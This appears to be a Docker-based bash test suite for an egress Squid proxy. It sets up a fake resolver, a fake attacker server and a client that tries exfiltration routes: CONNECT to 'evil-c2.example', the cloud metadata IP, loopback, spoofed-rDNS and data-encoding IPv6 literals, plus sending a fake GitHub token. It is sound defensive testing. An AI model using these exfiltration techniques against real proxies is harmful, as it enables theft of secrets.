#!/usr/bin/env bash
# Tests for the egress squid, fully local: the repo's squid.conf in compose.yaml's pinned image, on an
# internal network with a fake resolver, a fake "attacker" server and a raw-socket client. Nothing
# leaves the machine but the image pulls. Needs Docker.
# Run: bash vps/ticket-bay-bot/egress/test-egress.sh
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
SQUID_CONF=${SQUID_CONF:-$HERE/squid.conf}  # override to try another config
SQUID_IMG=$(sed -n 's/^ *image: *//p' "$HERE/compose.yaml")
NODE_IMG=node:22-bookworm-slim@sha256:e9f565d32859f0cbfb52125eafe8be39390f24dac302dc3cdf566e8ba3ab21ee  # the app's pin
NET=tq-egress-adv
P=tq-adv
down() { docker rm -f $P-dns $P-target $P-squid >/dev/null 2>&1; docker network rm $NET >/dev/null 2>&1; }
down
T=$(mktemp -d)
trap 'down; rm -rf "$T"' EXIT

# Fake resolver: answers PTR 192.0.2.77 -> github.com (what an attacker sets as rDNS on an IP they
# rent), NXDOMAIN for everything else, and logs every query it sees.
cat > "$T/dns.js" <<'EOF'
const d = require('dgram').createSocket('udp4');
const rev = ip => ip.split('.').reverse().join('.') + '.in-addr.arpa';
const ptr = { [rev('192.0.2.77')]: 'github.com' };
const enc = n => Buffer.concat([...n.split('.').map(l => Buffer.concat([Buffer.from([l.length]), Buffer.from(l)])), Buffer.from([0])]);
d.on('message', (m, r) => {
  let o = 12, labels = [];
  while (m[o]) { labels.push(m.slice(o + 1, o + 1 + m[o]).toString()); o += m[o] + 1; }
  const q = labels.join('.'), qtype = m.readUInt16BE(o + 1), qend = o + 5;
  console.log(`DNSQUERY type=${qtype} ${q}`);
  const h = Buffer.alloc(12); m.copy(h, 0, 0, 2);
  const ans = qtype === 12 && ptr[q];
  h.writeUInt16BE(ans ? 0x8180 : 0x8183, 2); h.writeUInt16BE(1, 4); h.writeUInt16BE(ans ? 1 : 0, 6);
  const parts = [h, m.slice(12, qend)];
  if (ans) { const rd = enc(ans); const a = Buffer.alloc(12); a.writeUInt16BE(0xc00c, 0); a.writeUInt16BE(12, 2);
    a.writeUInt16BE(1, 4); a.writeUInt32BE(60, 6); a.writeUInt16BE(rd.length, 10); parts.push(a, rd); }
  const nibbles = q.split('.').reverse().slice(2).join(''); // ip6.arpa name back to hex
  const delay = nibbles.startsWith('20010db84157') ? 1500 : 0; // an attacker's nameserver can answer slowly
  setTimeout(() => d.send(Buffer.concat(parts), r.port, r.address), delay);
});
d.bind(53);
EOF
# Fake attacker server on port 443: logs whatever reaches it.
cat > "$T/target.js" <<'EOF'
require('net').createServer(s => s.on('data', b => { console.log('ATTACKER RECEIVED: ' + b.toString().trim()); s.end('ok\n'); })).listen(443);
EOF
# Client: raw CONNECT/GET to squid, prints squid's status line, sends a fake secret through a tunnel.
cat > "$T/client.js" <<'EOF'
const [req] = process.argv.slice(2);
const s = require('net').connect(3128, '192.0.2.10', () => s.write(req.replace(/\\r\\n/g, '\r\n')));
let buf = '';
s.on('data', b => { buf += b; const line = buf.split('\r\n')[0];
  if (/ 200 /.test(line) && !buf.includes('ok')) { s.write('GITHUB_TOKEN=ghs_fake_exfil_marker\n'); }
  else { console.log(line + (buf.includes('ok\n') ? '  [tunnel reached the attacker]' : '')); s.destroy(); } });
s.setTimeout(8000, () => { console.log((buf.split('\r\n')[0] || 'TIMEOUT') ); s.destroy(); });
EOF
# Fire and forget: send the request and hang up at once, without reading squid's answer.
cat > "$T/fire.js" <<'EOF2'
const s = require('net').connect(3128, '192.0.2.10', () => { s.write(process.argv[2].replace(/\\r\\n/g, '\r\n')); setTimeout(() => s.resetAndDestroy(), 200); });
EOF2
printf 'nameserver 192.0.2.53\n' > "$T/resolv.conf"
chmod 644 "$T"/*

docker network create --internal --subnet 192.0.2.0/24 $NET >/dev/null
docker run -d --name $P-dns --network $NET --ip 192.0.2.53 -v "$T:/t:ro" $NODE_IMG node /t/dns.js >/dev/null
docker run -d --name $P-target --network $NET --ip 192.0.2.77 -v "$T:/t:ro" $NODE_IMG node /t/target.js >/dev/null
docker run -d --name $P-squid --network $NET --ip 192.0.2.10 \
  -v "$SQUID_CONF:/etc/squid/squid.conf:ro" -v "$T/resolv.conf:/etc/resolv.conf:ro" $SQUID_IMG >/dev/null
for i in $(seq 30); do docker exec $P-squid sh -c 'exec 3<>/dev/tcp/127.0.0.1/3128' 2>/dev/null && break; sleep 1; done

pass=0; fail=0
try() { # name, expected status, request
  out=$(docker run --rm --network $NET -v "$T:/t:ro" $NODE_IMG node /t/client.js "$3" 2>&1)
  if [[ $out == *" $2 "* || $out == *" $2" ]]; then pass=$((pass+1)); r=ok; else fail=$((fail+1)); r=FAIL; fi
  printf '%-4s %-52s expected %s, got: %s\n' "$r" "$1" "$2" "$out"
}
# Allowed, so squid tries the host: 503, because the fake resolver doesn't know it (no internet here).
try "allowed: CONNECT api.github.com:443"              503 'CONNECT api.github.com:443 HTTP/1.1\r\n\r\n'
try "control: CONNECT example.com:443"                403 'CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n'
try "subdomain: CONNECT gist.github.com:443"           403 'CONNECT gist.github.com:443 HTTP/1.1\r\n\r\n'
try "user content: CONNECT raw.githubusercontent.com"  403 'CONNECT raw.githubusercontent.com:443 HTTP/1.1\r\n\r\n'
try "port: CONNECT github.com:22"                      403 'CONNECT github.com:22 HTTP/1.1\r\n\r\n'
try "plain HTTP: GET http://github.com/"               403 'GET http://github.com/ HTTP/1.1\r\nHost: github.com\r\n\r\n'
try "manager: GET /squid-internal-mgr/menu"            403 'GET http://192.0.2.10:3128/squid-internal-mgr/menu HTTP/1.1\r\nHost: 192.0.2.10:3128\r\n\r\n'
try "metadata: CONNECT 169.254.169.254:443"            403 'CONNECT 169.254.169.254:443 HTTP/1.1\r\n\r\n'
try "loopback: CONNECT 127.0.0.1:443"                  403 'CONNECT 127.0.0.1:443 HTTP/1.1\r\n\r\n'
try "IP literal, attacker rDNS=github.com: CONNECT 192.0.2.77:443" 403 'CONNECT 192.0.2.77:443 HTTP/1.1\r\n\r\n'
try "IPv6 literal carrying data (denied, but DNS?)"   403 'CONNECT [2001:db8:7365:6372:6574:3d68:756e:7465]:443 HTTP/1.1\r\n\r\n'
fire() { docker run --rm --network $NET -v "$T:/t:ro" $NODE_IMG node /t/fire.js "$1"; echo "fired: $1"; }
fire 'CONNECT evil-c2.example:443 HTTP/1.1\r\n\r\n'
fire 'CONNECT [2001:db8:4157:535f:5345:4352:4554:3d31]:443 HTTP/1.1\r\n\r\n'
sleep 2
check() { if [ -z "$2" ]; then pass=$((pass+1)); echo "ok   $1"; else fail=$((fail+1)); echo "FAIL $1"; sed 's/^/     /' <<<"$2"; fi; }
check "nothing reached the attacker server" "$(docker logs $P-target 2>&1)"
check "squid looked up no IP's reverse DNS" "$(docker logs $P-dns 2>&1 | grep 'type=12 ')"
docker exec $P-squid cat /var/log/squid/access.log > "$T/access.log"
: > "$T/empty.log"; SQUID_LOG=$T/empty.log SQUID_DENIALS_STATE=$T/seen bash "$HERE/../squid-denials.sh"
denials=$(SQUID_LOG=$T/access.log SQUID_DENIALS_STATE=$T/seen bash "$HERE/../squid-denials.sh")
want=$(grep -c ' TCP_DENIED' "$T/access.log"); got=$(grep -c ' UTC  ' <<<"$denials")
check "squid-denials reports all $want denials" "$([ "$got" = "$want" ] || { echo "reported $got:"; echo "$denials"; })"
echo "$pass passed, $fail failed"
[ "$fail" = 0 ]
